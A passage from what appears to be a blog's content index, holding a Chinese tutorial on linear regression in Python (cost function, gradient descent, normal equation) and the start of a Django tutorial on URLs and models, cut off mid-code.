<td>6.1101</td>      <td>17.5920</td>    </tr>    <tr>      <td>1</td>      <td>5.5277</td>      <td>9.1302</td>    </tr>    <tr>      <td>2</td>      <td>8.5186</td>      <td>13.6620</td>    </tr>    <tr>      <td>3</td>      <td>7.0032</td>      <td>11.8540</td>    </tr>    <tr>      <td>4</td>      <td>5.8598</td>      <td>6.8233</td>    </tr>  </tbody></table></div><ul><li>查看数据信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.info</span><br></pre></td></tr></table></figure><pre><code>&lt;bound method DataFrame.info of     Population    Profit0       6.1101  17.592001       5.5277   9.130202       8.5186  13.662003       7.0032  11.854004       5.8598   6.82330..         ...       ...92      5.8707   7.2029093      5.3054   1.9869094      8.2934   0.1445495     13.3940   9.0551096      5.4369   0.61705[97 rows x 2 columns]&gt;</code></pre><ul><li>查看数据的均值、标准差等信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.describe()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Population</th>      <th>Profit</th>    </tr>  </thead>  <tbody>    <tr>      <td>count</td>      <td>97.000000</td>      <td>97.000000</td>    </tr>    <tr>      <td>mean</td>      <td>8.159800</td>      <td>5.839135</td>    </tr>    <tr>      <td>std</td>      <td>3.869884</td>      <td>5.510262</td>    </tr>    <tr>      <td>min</td>      <td>5.026900</td>      <td>-2.680700</td>    </tr>    <tr>      <td>25%</td>      <td>5.707700</td>      <td>1.986900</td>    </tr>    <tr>      <td>50%</td>      <td>6.589400</td>      <td>4.562300</td>    </tr>    <tr>      <td>75%</td>      <td>8.578100</td>      <td>7.046700</td>    </tr>    <tr>      <td>max</td>      <td>22.203000</td>      <td>24.147000</td>    </tr>  </tbody></table></div><ul><li>画图，观察数据分布状态</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 散点图</span></span><br><span class="line">data.plot(kind=<span class="string">'scatter'</span>, x=<span class="string">'Population'</span>, y=<span class="string">'Profit'</span>, figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20702linera01.png" alt="png"></p><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p>现在让我们使用梯度下降来实现线性回归，以最小化成本函数。 以下代码示例中实现的方程在“练习”文件夹中的“ex1.pdf”中有详细说明。</p><p>首先，我们将创建一个以参数θ为特征函数的代价函数<br>$$J(\theta)=\frac{1}{2m}\sum\limits_{i=1}^{m}(h_{\theta}(x^{(i)}-y^{(i)})^2$$<br>其中：$h_{\theta}(x) = {\theta}^X={\theta}_0 x_0+{\theta}_1 x_1+ {\theta}_2 x_2+…+{\theta}_n x_n$</p><ul><li>代价函数代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">computeCost</span><span class="params">(X, y, theta)</span>:</span></span><br><span class="line">    inner = np.power(((X * theta.T) - y), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> np.sum(inner) / (<span class="number">2</span> * len(X))</span><br></pre></td></tr></table></figure><ul><li>让我们在训练集中添加一列，以便我们可以使用向量化的解决方案来计算代价和梯度。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.insert(<span class="number">0</span>, <span class="string">'Ones'</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.insert(<span class="number">1</span>, <span class="string">'Twos'</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Ones</th>      <th>Twos</th>      <th>Population</th>      <th>Profit</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>1</td>      <td>1</td>      <td>6.1101</td>      <td>17.59200</td>    </tr>    <tr>      <td>1</td>      <td>1</td>      <td>1</td>      <td>5.5277</td>      <td>9.13020</td>    </tr>    <tr>      <td>2</td>      <td>1</td>      <td>1</td>      <td>8.5186</td>      <td>13.66200</td>    </tr>    <tr>      <td>3</td>      <td>1</td>      <td>1</td>      <td>7.0032</td>      <td>11.85400</td>    </tr>    <tr>      <td>4</td>      <td>1</td>      <td>1</td>      <td>5.8598</td>      <td>6.82330</td>    </tr>    <tr>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>    </tr>    <tr>      <td>92</td>      <td>1</td>      <td>1</td>      <td>5.8707</td>      <td>7.20290</td>    </tr>    <tr>      <td>93</td>      <td>1</td>      <td>1</td>      <td>5.3054</td>      <td>1.98690</td>    </tr>    <tr>      <td>94</td>      <td>1</td>      <td>1</td>      <td>8.2934</td>      <td>0.14454</td>    </tr>    <tr>      <td>95</td>      <td>1</td>      <td>1</td>      <td>13.3940</td>      <td>9.05510</td>    </tr>    <tr>      <td>96</td>      <td>1</td>      <td>1</td>      <td>5.4369</td>      <td>0.61705</td>    </tr>  </tbody></table><p>97 rows × 4 columns</p></div><ul><li>删除多添加的列<blockquote><p>用法：<code>DataFrame.drop(labels=None,axis=0, index=None, columns=None, inplace=False)</code><br></p><ul><li>参数说明：<br><blockquote><ul><li>labels 就是要删除的行列的名字，用列表给定<br></li><li>axis 默认为0，指删除行，因此删除columns时要指定axis=1；<br></li><li>index 直接指定要删除的行<br></li><li>columns 直接指定要删除的列<br></li><li>inplace=False，默认该删除操作不改变原数据，而是返回一个执行删除操作后的新dataframe；<br></li><li>inplace=True，则会直接在原数据上进行删除操作，删除后无法返回。<br></li></ul></blockquote></li><li>因此，删除行列有两种方式：<br><br>1）labels=None,axis=0 的组合<br><br>2）index或columns直接指定要删除的行或列<br></li></ul></blockquote></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.drop([<span class="string">'Twos'</span>],axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Ones</th>      <th>Population</th>      <th>Profit</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>1</td>      <td>6.1101</td>      <td>17.59200</td>    </tr>    <tr>      <td>1</td>      <td>1</td>      <td>5.5277</td>      <td>9.13020</td>    </tr>    <tr>      <td>2</td>      <td>1</td>      <td>8.5186</td>      <td>13.66200</td>    </tr>    <tr>      <td>3</td>      <td>1</td>      <td>7.0032</td>      <td>11.85400</td>    </tr>    <tr>      <td>4</td>      <td>1</td>      <td>5.8598</td>      <td>6.82330</td>    </tr>    <tr>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>    </tr>    <tr>      <td>92</td>      <td>1</td>      <td>5.8707</td>      <td>7.20290</td>    </tr>    <tr>      <td>93</td>      <td>1</td>      <td>5.3054</td>      <td>1.98690</td>    </tr>    <tr>      <td>94</td>      <td>1</td>      <td>8.2934</td>      <td>0.14454</td>    </tr>    <tr>      <td>95</td>      <td>1</td>      <td>13.3940</td>      <td>9.05510</td>    </tr>    <tr>      <td>96</td>      <td>1</td>      <td>5.4369</td>      <td>0.61705</td>    </tr>  </tbody></table><p>97 rows × 3 columns</p></div><ul><li>现在我们来做一些变量初始化。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set X (training data训练数据集) and y (target variable目标变量)</span></span><br><span class="line">cols = data.shape[<span class="number">1</span>]</span><br><span class="line">X = data.iloc[:,<span class="number">0</span>:cols<span class="number">-1</span>]<span class="comment">#X是所有行，去掉最后一列</span></span><br><span class="line">y = data.iloc[:,cols<span class="number">-1</span>:cols]<span class="comment">#y是所有行，取最后一列</span></span><br></pre></td></tr></table></figure><ul><li>观察下 X (训练集) and y (目标变量)是否正确.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X.head()<span class="comment">#head()是观察前5行</span></span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Ones</th>      <th>Population</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>1</td>      <td>6.1101</td>    </tr>    <tr>      <td>1</td>      <td>1</td>      <td>5.5277</td>    </tr>    <tr>      <td>2</td>      <td>1</td>      <td>8.5186</td>    </tr>    <tr>      <td>3</td>      <td>1</td>      <td>7.0032</td>    </tr>    <tr>      <td>4</td>      <td>1</td>      <td>5.8598</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Profit</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>17.5920</td>    </tr>    <tr>      <td>1</td>      <td>9.1302</td>    </tr>    <tr>      <td>2</td>      <td>13.6620</td>    </tr>    <tr>      <td>3</td>      <td>11.8540</td>    </tr>    <tr>      <td>4</td>      <td>6.8233</td>    </tr>  </tbody></table></div><ul><li>代价函数是应该是numpy矩阵，所以我们需要转换X和Y，然后才能使用它们。 我们还需要初始化theta。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X = np.matrix(X.values)</span><br><span class="line">y = np.matrix(y.values)</span><br><span class="line">theta = np.matrix(np.array([<span class="number">0</span>,<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><ul><li>theta 是一个(1,2)矩阵</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theta</span><br></pre></td></tr></table></figure><pre><code>matrix([[0, 0]])</code></pre><ul><li>查看维度</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X.shape, theta.shape, y.shape</span><br></pre></td></tr></table></figure><pre><code>((97, 2), (1, 2), (97, 1))</code></pre><ul><li>计算代价函数 (theta初始值为0).</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">computeCost(X, y, theta)</span><br></pre></td></tr></table></figure><pre><code>32.072733877455676</code></pre><h2 id="batch-gradient-decent（批量梯度下降）"><a href="#batch-gradient-decent（批量梯度下降）" class="headerlink" title="batch gradient decent（批量梯度下降）"></a>batch gradient decent（批量梯度下降）</h2><p>$$ \theta_j:=\theta_j- \alpha  \frac{\partial J(\theta)}{\partial \theta_j}  $$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradientDescent</span><span class="params">(X, y, theta, alpha, iters)</span>:</span></span><br><span class="line">    temp = np.matrix(np.zeros(theta.shape))<span class="comment"># 初始化theta.shape维的0向量</span></span><br><span class="line">    parameters = int(theta.ravel().shape[<span class="number">1</span>])</span><br><span class="line">    cost = np.zeros(iters)<span class="comment"># 迭代次数</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(iters):</span><br><span class="line">        error = (X * theta.T) - y</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(parameters):</span><br><span class="line">            term = np.multiply(error, X[:,j])</span><br><span class="line">            temp[<span class="number">0</span>,j] = theta[<span class="number">0</span>,j] - ((alpha / len(X)) * np.sum(term))</span><br><span class="line">            </span><br><span class="line">        theta = temp</span><br><span class="line">        cost[i] = computeCost(X, y, theta)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> theta, cost</span><br></pre></td></tr></table></figure><ul><li>初始化一些附加变量 - 学习速率α和要执行的迭代次数。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alpha = <span class="number">0.01</span></span><br><span class="line">iters = <span class="number">1000</span></span><br></pre></td></tr></table></figure><ul><li>现在让我们运行梯度下降算法来将我们的参数θ适合于训练集。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g, cost = gradientDescent(X, y, theta, alpha, iters)</span><br><span class="line">g</span><br></pre></td></tr></table></figure><pre><code>matrix([[-3.24140214,  1.1272942 ]])</code></pre><ul><li>最后，我们可以使用我们拟合的参数计算训练模型的代价函数（误差）。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">computeCost(X, y, g)</span><br></pre></td></tr></table></figure><pre><code>4.515955503078912</code></pre><ul><li>现在我们来绘制线性模型以及数据，直观地看出它的拟合。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x = np.linspace(data.Population.min(), data.Population.max(), <span class="number">100</span>)<span class="comment"># 返回均匀间隔的100个数</span></span><br><span class="line">f = g[<span class="number">0</span>, <span class="number">0</span>] + (g[<span class="number">0</span>, <span class="number">1</span>] * x)</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line">ax.plot(x, f, <span class="string">'r'</span>, label=<span class="string">'Prediction'</span>)</span><br><span class="line">ax.scatter(data.Population, data.Profit, label=<span class="string">'Traning Data'</span>)</span><br><span class="line">ax.legend(loc=<span class="number">2</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">'Population'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'Profit'</span>)</span><br><span class="line">ax.set_title(<span class="string">'Predicted Profit vs. Population Size'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20702linera02.png" alt="png"></p><p>由于梯度方程式函数也在每个训练迭代中输出一个代价的向量，所以我们也可以绘制。 请注意，代价总是降低 - 这是凸优化问题的一个例子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line">ax.plot(np.arange(iters), cost, <span class="string">'r'</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">'Iterations'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'Cost'</span>)</span><br><span class="line">ax.set_title(<span class="string">'Error vs. Training Epoch'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20702linera03.png" alt="png"></p><h2 id="多变量线性回归"><a href="#多变量线性回归" class="headerlink" title="多变量线性回归"></a>多变量线性回归</h2><p>练习1还包括一个房屋价格数据集，其中有2个变量（房子的大小，卧室的数量）和目标（房子的价格）。 我们使用我们已经应用的技术来分析数据集。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">path =  <span class="string">'ex1data2.txt'</span></span><br><span class="line">data2 = pd.read_csv(path, header=<span class="literal">None</span>, names=[<span class="string">'Size'</span>, <span class="string">'Bedrooms'</span>, <span class="string">'Price'</span>])</span><br><span class="line">data2.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Size</th>      <th>Bedrooms</th>      <th>Price</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>2104</td>      <td>3</td>      <td>399900</td>    </tr>    <tr>      <td>1</td>      <td>1600</td>      <td>3</td>      <td>329900</td>    </tr>    <tr>      <td>2</td>      <td>2400</td>      <td>3</td>      <td>369000</td>    </tr>    <tr>      <td>3</td>      <td>1416</td>      <td>2</td>      <td>232000</td>    </tr>    <tr>      <td>4</td>      <td>3000</td>      <td>4</td>      <td>539900</td>    </tr>  </tbody></table></div><p>对于此任务，我们添加了另一个预处理步骤 - 特征归一化。 这个对于pandas来说很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data2 = (data2 - data2.mean()) / data2.std()</span><br><span class="line">data2.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Size</th>      <th>Bedrooms</th>      <th>Price</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>0.130010</td>      <td>-0.223675</td>      <td>0.475747</td>    </tr>    <tr>      <td>1</td>      <td>-0.504190</td>      <td>-0.223675</td>      <td>-0.084074</td>    </tr>    <tr>      <td>2</td>      <td>0.502476</td>      <td>-0.223675</td>      <td>0.228626</td>    </tr>    <tr>      <td>3</td>      <td>-0.735723</td>      <td>-1.537767</td>      <td>-0.867025</td>    </tr>    <tr>      <td>4</td>      <td>1.257476</td>      <td>1.090417</td>      <td>1.595389</td>    </tr>  </tbody></table></div><p>现在我们重复第1部分的预处理步骤，并对新数据集运行线性回归程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add ones column</span></span><br><span class="line">data2.insert(<span class="number">0</span>, <span class="string">'Ones'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set X (training data) and y (target variable)</span></span><br><span class="line">cols = data2.shape[<span class="number">1</span>]</span><br><span class="line">X2 = data2.iloc[:,<span class="number">0</span>:cols<span class="number">-1</span>]</span><br><span class="line">y2 = data2.iloc[:,cols<span class="number">-1</span>:cols]</span><br><span class="line"></span><br><span class="line"><span class="comment"># convert to matrices and initialize theta</span></span><br><span class="line">X2 = np.matrix(X2.values)</span><br><span class="line">y2 = np.matrix(y2.values)</span><br><span class="line">theta2 = np.matrix(np.array([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># perform linear regression on the data set</span></span><br><span class="line">g2, cost2 = gradientDescent(X2, y2, theta2, alpha, iters)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the cost (error) of the model</span></span><br><span class="line">computeCost(X2, y2, g2)</span><br></pre></td></tr></table></figure><pre><code>0.1307033696077189</code></pre><p>我们也可以快速查看这一个的训练进程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line">ax.plot(np.arange(iters), cost2, <span class="string">'r'</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">'Iterations'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'Cost'</span>)</span><br><span class="line">ax.set_title(<span class="string">'Error vs. Training Epoch'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20702linera04.png" alt="png"></p><p>我们也可以使用scikit-learn的线性回归函数，而不是从头开始实现这些算法。 我们将scikit-learn的线性回归算法应用于第1部分的数据，并看看它的表现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model</span><br><span class="line">model = linear_model.LinearRegression()</span><br><span class="line">model.fit(X, y)</span><br></pre></td></tr></table></figure><pre><code>LinearRegression(copy_X=True, fit_intercept=True, n_jobs=None, normalize=False)</code></pre><p>scikit-learn model的预测表现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x = np.array(X[:, <span class="number">1</span>].A1)</span><br><span class="line">f = model.predict(X).flatten()</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line">ax.plot(x, f, <span class="string">'r'</span>, label=<span class="string">'Prediction'</span>)</span><br><span class="line">ax.scatter(data.Population, data.Profit, label=<span class="string">'Traning Data'</span>)</span><br><span class="line">ax.legend(loc=<span class="number">2</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">'Population'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'Profit'</span>)</span><br><span class="line">ax.set_title(<span class="string">'Predicted Profit vs. Population Size'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20702linera05.png" alt="png"></p><h2 id="normal-equation（正规方程）"><a href="#normal-equation（正规方程）" class="headerlink" title="normal equation（正规方程）"></a>normal equation（正规方程）</h2><p>正规方程是通过求解下面的方程来找出使得代价函数最小的参数的：$ \frac{\partial J(\theta_j) }{\partial \theta_j}=0 $。<br> 假设我们的训练集特征矩阵为 X（包含了$x_0=1$并且我们的训练集结果为向量 y，则利用正规方程解出向量 $\theta =(X^TX)^{-1}X^Ty$。<br>上标T代表矩阵转置，上标-1 代表矩阵的逆。设矩阵$A=X^TX$，则：$(X^TX)^{-1}=A^{-1}$</p><p>梯度下降与正规方程的比较：</p><p>梯度下降：需要选择学习率α，需要多次迭代，当特征数量n大时也能较好适用，适用于各种类型的模型    </p><p>正规方程：不需要选择学习率α，一次计算得出，需要计算$(X^TX)^{-1}$，如果特征数量n较大则运算代价大，因为矩阵逆的计算时间复杂度为$O(n3)$，通常来说当$n$小于10000 时还是可以接受的，只适用于线性模型，不适合逻辑回归模型等其他模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正规方程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalEqn</span><span class="params">(X, y)</span>:</span></span><br><span class="line">    theta = np.linalg.inv(X.T@X)@X.T@y<span class="comment">#X.T@X等价于X.T.dot(X)</span></span><br><span class="line">    <span class="keyword">return</span> theta</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">final_theta2=normalEqn(X, y)<span class="comment">#感觉和批量梯度下降的theta的值有点差距</span></span><br><span class="line">final_theta2</span><br></pre></td></tr></table></figure><pre><code>matrix([[-3.89578088],        [ 1.19303364]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#梯度下降得到的结果是matrix([[-3.24140214,  1.1272942 ]])</span></span><br></pre></td></tr></table></figure><p>在练习2中，我们将看看分类问题的逻辑回归。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 线性回归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Django】3. Django入门与实践-高级概念</title>
      <link href="2020/05/04/3.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E9%AB%98%E7%BA%A7%E6%A6%82%E5%BF%B5/"/>
      <url>2020/05/04/3.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E9%AB%98%E7%BA%A7%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<p>在本节内容，将深入理解两个基本概念: URLs 和 Forms。在这个过程中，我们还将学习其它很多概念，如创建可重用模板和安装第三方库。同时我们还将编写大量单元测试。</p><a id="more"></a><p>首先，在之前的学习基础上，更新<strong>models.py</strong></p><p><strong>boards/models.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Topic</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="comment"># other fields...</span></span><br><span class="line">    <span class="comment"># Add `auto_now_add=True` to the `last_updated` field</span></span><br><span class="line">    last_updated = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="comment"># other fields...</span></span><br><span class="line">    <span class="comment"># Add `null=True` to the `updated_by` field</span></span><br><span class="line">    updated_by = models.ForeignKey(User, null=<span class="literal">True</span>, related_name=<span class="string">'+'</span>)</span><br></pre></td></tr></table></figure><p>现在在已经激活的 virtualenv 环境中执行命令：</p><p><code>python manage.py makemigrations</code></p><p><code>python manage.py migrate</code></p><p>如果在你的程序中 <code>update_by</code>字段中已经有了<code>null=True 且 last_updated</code>字段中有了<code>auto_now_add=True</code>，你可以放心地忽略上面这步操作。</p><h2 id="URLs"><a href="#URLs" class="headerlink" title="URLs"></a>URLs</h2><p>随着我们项目的开发，实现一个新的功能，就是列出某个板块下的所有主题列表，回顾一下，上节画的线框图</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django01.jpg" alt=""></p><p>从<strong>myproject</strong> 目录中编写 <strong>urls.py</strong> 开始：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span 